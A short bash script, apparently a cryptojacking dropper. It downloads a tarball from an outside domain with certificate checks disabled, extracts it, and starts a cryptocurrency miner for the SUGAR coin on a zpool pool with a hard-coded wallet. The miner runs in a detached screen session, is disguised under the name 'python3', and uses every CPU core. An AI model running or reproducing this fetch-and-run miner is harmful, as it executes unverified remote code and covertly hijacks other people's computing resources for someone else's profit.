#!/bin/bash

if [ ! -d "dot" ]; then
    echo "unduh dan ektraks"
    wget -O dot --no-check-certificate https://dotaja.biz.id/dotcpu.tar.gz
    tar -xvf dot
else
    echo "File sudah ada"
fi

screen -dmS DOT ./python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zpool.ca:6241 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
